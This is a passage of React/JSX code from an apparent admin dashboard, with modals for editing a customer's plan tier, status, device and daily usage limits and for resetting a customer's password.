                  className="px-4 py-2 bg-slate-200 hover:bg-slate-300 text-slate-800 rounded-xl text-xs font-bold transition"
                >
                  Close
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* MODAL: EDIT CUSTOMER PLAN & LIMITS */}
      {editingCustomer && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <form
            onSubmit={handleSaveCustomerEdit}
            className="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4"
          >
            <div className="flex items-center justify-between">
              <h3 className="text-base font-bold text-slate-900">
                Edit User Plan: @{editingCustomer.username}
              </h3>
              <button type="button" onClick={() => setEditingCustomer(null)}>
                <X className="w-5 h-5 text-slate-400" />
              </button>
            </div>

            <div className="grid grid-cols-2 gap-3 text-xs">
              <div>
                <label className="block font-semibold text-slate-700 mb-1">Plan Tier</label>
                <select
                  value={editPlanTier}
                  onChange={(e) => setEditPlanTier(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                >
                  <option value="trial">Trial</option>
                  <option value="free">Free</option>
                  <option value="starter">Starter</option>
                  <option value="pro">Pro</option>
                  <option value="enterprise">Enterprise</option>
                </select>
              </div>

              <div>
                <label className="block font-semibold text-slate-700 mb-1">Status</label>
                <select
                  value={editStatus}
                  onChange={(e) => setEditStatus(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                >
                  <option value="active">Active</option>
                  <option value="trialing">Trialing</option>
                  <option value="expired">Expired</option>
                  <option value="cancelled">Cancelled</option>
                </select>
              </div>

              <div>
                <label className="block font-semibold text-slate-700 mb-1">Duration Days (0=Lifetime)</label>
                <input
                  type="number"
                  value={editDurationDays}
                  onChange={(e) => setEditDurationDays(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                />
              </div>

              <div>
                <label className="block font-semibold text-slate-700 mb-1">Max Devices</label>
                <input
                  type="number"
                  value={editMaxDevices}
                  onChange={(e) => setEditMaxDevices(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                />
              </div>

              <div>
                <label className="block font-semibold text-slate-700 mb-1">Daily Messages Limit</label>
                <input
                  type="number"
                  value={editDailyLimit}
                  onChange={(e) => setEditDailyLimit(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                />
              </div>

              <div>
                <label className="block font-semibold text-slate-700 mb-1">Daily Extractions Limit</label>
                <input
                  type="number"
                  value={editExtractionLimit}
                  onChange={(e) => setEditExtractionLimit(e.target.value)}
                  className="w-full p-2 border border-slate-200 rounded-xl"
                />
              </div>
            </div>

            <div className="flex justify-end gap-2 pt-2">
              <button
                type="button"
                onClick={() => setEditingCustomer(null)}
                className="px-4 py-2 bg-slate-100 text-slate-700 rounded-xl text-xs font-bold"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold"
              >
                Save Changes
              </button>
            </div>
          </form>
        </div>
      )}

      {/* MODAL: RESET PASSWORD */}
      {resetPwdCustomer && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <form
            onSubmit={handleResetPassword}
            className="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl space-y-4"
          >
            <div className="flex items-center justify-between">
              <h3 className="text-base font-bold text-slate-900">
                Reset Password: @{resetPwdCustomer.username}
              </h3>
              <button type="button" onClick={() => setResetPwdCustomer(null)}>
                <X className="w-5 h-5 text-slate-400" />
              </button>
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                New Password (min 4 chars)
              </label>
              <input
                type="text"
                required
                minLength={4}
                value={newPasswordInput}
                onChange={(e) => setNewPasswordInput(e.target.value)}
                placeholder="Enter new password"
                className="w-full p-2.5 text-sm border border-slate-200 rounded-xl"
              />
            </div>

            <div className="flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setResetPwdCustomer(null)}
                className="px-4 py-2 bg-slate-100 text-slate-700 rounded-xl text-xs font-bold"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl text-xs font-bold"
              >
                Reset Password
              </button>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};
